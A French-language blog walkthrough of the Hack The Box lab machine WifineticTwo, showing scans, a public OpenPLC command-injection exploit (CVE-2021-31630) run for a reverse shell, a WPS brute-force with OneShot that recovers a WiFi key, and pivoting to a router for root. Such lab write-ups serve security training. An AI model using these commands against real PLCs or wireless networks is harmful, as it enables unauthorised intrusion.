---
date: 2024-07-26T15:04:48-05:00
# description: ""
image: "/images/HTB-WifineticTwo/WifineticTwo.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: WifineticTwo"
type: "post"
---

* Platforme: Hack The Box
* Lien: [WifineticTwo](https://app.hackthebox.com/machines/WifineticTwo)
* Niveau: Moyen
* OS: Linux
---

WifineticTwo est une machine unique axée sur l'exploitation WiFi. Le défi commence avec une page OpenPLC accessible à l'aide d'identifiants par défaut. En utilisant le `CVE-2021-31630`, nous obtenons un accès initial. Une fois au sein du système, nous utilisons une attaque par force brute, pour récupérer la clé WPS, configurer l'interface sans fil, et scanner la passerelle par défaut pour découvrir les services internes. Nous accédons ensuite à l'interface de configuration Lua, définissons un nouveau mot de passe, nous connectons via SSH et récupérons le drapeau root.

Adresse IP cible - `10.10.11.7`


## Scanning

```
nmap -sC -sV -oA nmap/WifineticTwo 10.10.11.7
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-25 16:39 CDT
Nmap scan report for 10.10.11.7
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoQ.AmaMpNOmDGYGQIpwEDtx5obFU08; Expires=Thu, 25-Apr-2024 21:44:45 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:45 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.yRUPYgrZ-4AxE2_xa8pbWYvKGq8; Expires=Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:44 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZirNoA.Q1AI3_zm-RnXi7eGU_QELZS5lag; Expires=Thu, 25-Apr-2024 21:44:44 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Thu, 25 Apr 2024 21:39:44 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=4/25%Time=662ACD97%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,24C,"HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm
SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\
SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn
SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.yRUPYgrZ-4AxE2_xa8pbW
SF:YvKGq8;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20GMT;\x20HttpOnly;
SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x
SF:20Thu,\x2025\x20Apr\x202024\x2021:39:44\x20GMT\r\n\r\n<!DOCTYPE\x20HTML
SF:\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>Red
SF:irecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20should\x2
SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20<a\x20hre
SF:f=\"/login\">/login</a>\.\x20\x20If\x20not\x20click\x20the\x20link\.")%
SF:r(HTTPOptions,14E,"HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html
SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co
SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZirNoA\.Q1AI
SF:3_zm-RnXi7eGU_QELZS5lag;\x20Expires=Thu,\x2025-Apr-2024\x2021:44:44\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz
SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\x202024\x2
SF:021:39:44\x20GMT\r\n\r\n")%r(RTSPRequest,CF,"HTTP/1\.1\x20400\x20Bad\x2
SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont
SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n<html><body><h1>4
SF:00\x20Bad\x20request</h1>\nYour\x20browser\x20sent\x20an\x20invalid\x20
SF:request\.\n</body></html>\n")%r(FourOhFourRequest,224,"HTTP/1\.0\x20404
SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon
SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG
SF:VybWFuZW50Ijp0cnVlfQ\.ZirNoQ\.AmaMpNOmDGYGQIpwEDtx5obFU08;\x20Expires=T
SF:hu,\x2025-Apr-2024\x2021:44:45\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver
SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Thu,\x2025\x20Apr\
SF:x202024\x2021:39:45\x20GMT\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W
SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\">\n<title>404\x20Not\x20Found</ti
SF:tle>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x
SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\
SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga
SF:in\.</p>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

Notre scan révèle deux ports ouverts: 22 (SSH) et 8080 (http-proxy).

## Enumération

Nous trouvons une page de connexion à `http://10.10.11.7:8080` pour OpenPLC Webserver.

![OpenPLC login form](/images/HTB-WifineticTwo/OpenPLC-webserver.png)

Les informations d'identification par défaut nous permettent de nous connecter.

![OpenPLC default credentials](/images/HTB-WifineticTwo/openplc-creds.png)

Nous accédons au tableau de bord. Les différentes sections nous donnent quelques informations mais rien d'intéressant pour l'instant.

![OpenPLC dashboard](/images/HTB-WifineticTwo/openPLC-dashboard.png)

## Accès initial

Nous trouvons le [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630) qui est une vulnérabilité d'injection de commande pour Open PLC Webserver v3 et un exploit est disponible [ici](https://github.com/Hunt3r0x/CVE-2021-31630-HTB).

> Pour que cet exploit fonctionne, vous devez mettre à jour le fichier `/etc/hosts` avec `wifinetictwo.htb`.

Après exécution de l'exploit, nous obtenons un shell sur notre listener.

```
python ./exploit.py -ip <IP_ADDRESS> -p <PORT_NUMBER> -u openplc -pwd openplc
```

![OpenPLC RCE](/images/HTB-WifineticTwo/openplc-rce.png)

![WifineticTwo foothold](/images/HTB-WifineticTwo/foothold.png)

Notre shell peut être amélioré à l'aide des commandes ci-dessous.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
stty rows 38 columns 116
```

Nous sommes connectés en tant que `root` et nous récupérons le drapeau utilisateur dans `/root`.

![WifineticTwo user flag](/images/HTB-WifineticTwo/user-flag.png)

## Escalade des privilèges

Il est étrange que nous soyons déjà root pour le premier drapeau. Cela signifie probablement que nous devons faire une sorte de pivot ou accéder à un autre service ou hôte.

Le nom de cette machine évoque évidemment le WiFi, alors vérifions les interfaces réseau avec `ifconfig`.

![WifineticTwo ifconfig command](/images/HTB-WifineticTwo/ifconfig-cmd.png)

### Récupération de la clé WPS

Nous trouvons une interface réseau sans fil `wlan0`, nous savons que les machines HTB sont des VMs et qu'elles n'ont pas d'accès à l'internet, donc cette interface réseau tire probablement parti d'une virtualisation WiFi.

Nous pouvons récupérer des informations sur l'interface sans fil avec `iw dev wlan0 scan`. Dans notre cas, le scan révèle un réseau WiFi appelé `plcrouter` avec un BSSID de `02:00:00:00:01:00`, il utilise aussi `WPS : Version : 1.0`.

![WifineticTwo iw scan](/images/HTB-WifineticTwo/iw-scan.png)

Après avoir lu la page [Pentesting Wifi](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#wps) on HackTricks, nous apprenons qu'il est possible de faire du brute-force avec les clés WPS. Le problème est que pour utiliser des outils tels que `reaver` et `bully`, nous avons besoin d'un adaptateur sans fil (que je n'ai pas). Heureusement, nous pouvons aussi utiliser [OneShot-C](https://github.com/nikita-yfh/OneShot-C) pour effectuer l'attaque.

> J'ai finalement utilisé la [version Python](https://github.com/kimocoder/OneShot) de OneShot en raison de problèmes de compilation avec la version C.

Nous clonons le repo, et transférons le fichier `oneshot.py` sur la cible avec `curl`.

![One-shot-py](/images/HTB-WifineticTwo/oneshot-py.png)

Nous pouvons voir comment utiliser le script avec `python3 oneshot.py -h`.

![One-shot-py help](/images/HTB-WifineticTwo/oneshot-py-help.png)

Nous lançons ensuite notre attaque avec la commande ci-dessous en utilisant le nom de l'interface et le BSSID. Nous réussissons à récupérer la clé qui est `NoWEDWoKnowWhaTisReal123!`.

```
python3 ./oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
```

![One-shot attack](/images/HTB-WifineticTwo/oneshot-attack.png)

### Configuration de l'interface sans fil

Nous devons apprendre comment nous connecter au WiFi à partir de la ligne de commande. En combinant les informations de [cette page](https://askubuntu.com/questions/138472/how-do-i-connect-to-a-wpa-wifi-network-using-the-command-line) and [celle-ci](https://unix.stackexchange.com/questions/283722/how-to-connect-to-wifi-from-command-line) nous comprenons maintenant que nous avons besoin d'un fichier de configuration.

Nous le créons avec `wpa_passphrase`.

```
wpa_passphrase 'plcrouter' 'NoWWEDoKnowWhaTisReal123!' > wpa.conf
```

![WPA config file](/images/HTB-WifineticTwo/wpa_passphrase.png)

> Le processus WPA supplicant est responsable de la gestion des connexions sans fil sur les systèmes Linux.

```
wpa_supplicant -B -c wpa.conf -i wlan0
```

![WPA supplicant](/images/HTB-WifineticTwo/wpa_supplicant.png)

Nous vérifions la configuration de l'interface avec `iwconfig`.

![iwconfig command](/images/HTB-WifineticTwo/iwconfig.png)

En utilisant `ifconfig` nous pouvons voir que l'interface est en place mais qu'il n'y a pas d'adresse IP configurée pour `wlan0`.

![wlan0 no IP address](/images/HTB-WifineticTwo/ifconfig-noIP.png)

Nous pouvons définir manuellement une adresse IP avec 

```
ifconfig wlan0 <IP_ADDRESS> netmask <NETWORK_MASK>
```

**Exemple**
```
ifconfig wlan0 192.168.1.50 netmask 255.255.255.0
```

![ifconfig IP address](/images/HTB-WifineticTwo/ifconfig-IP.png)

Maintenant que notre nouvelle interface est correctement configurée, scannons-la dans l'espoir de découvrir d'autres pistes.

Nous téléchargeons le binaire nmap depuis [ce dépôt github](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) et l'envoyons à la cible. Assurez-vous de le rendre exécutable avec `chmod +x nmap`.

```
./nmap -sn 192.168.1.0/24
```

Nous voyons la passerelle par défaut `192.168.1.1` et notre adresse configurée `192.168.1.50` parmi d'autres adresses. 

![nmap scan configured IP address](/images/HTB-WifineticTwo/nmap_scan.png)

Après avoir scanné la passerelle par défaut, nous découvrons d'autres services, nous aurons besoin d'un tunnel pour y accéder (j'ai utilisé [chisel](https://github.com/jpillora/chisel)).

![nmap default gateway scan](/images/HTB-WifineticTwo/nmap-internal.png)

Nous trouvons une page intitulée `ap - LuCI`, qui fait référence à [Lua Configuration Interface](https://launchpad.net/luci), "une collection de logiciels Lua libres pour les appareils embarqués (embedded devices)". 

![LuCI page](/images/HTB-WifineticTwo/LuCI.png)

Pour l'authentification, `root` fonctionnera pour le mot de passe et il nous est demandé d'en configurer un nouveau après s'être connecté.

Sous `System` --> `Administration` nous remarquons que nous avons l'option de nous connecter avec un mot de passe via SSH. 

![LuCI SSH access](/images/HTB-WifineticTwo/LuCI-SSH-access.png)

Avec notre mot de passe nouvellement configuré, nous nous connectons via SSH et trouvons le drapeau root.

![Root flag](/images/HTB-WifineticTwo/root-flag.png)

## Mots de fin

J'ai apprécié cette machine qui m'a permis de changer de la routine habituelle de l'exploitation web, et j'espère que cet article vous a été utile. Merci d'avoir consulté mon blog !
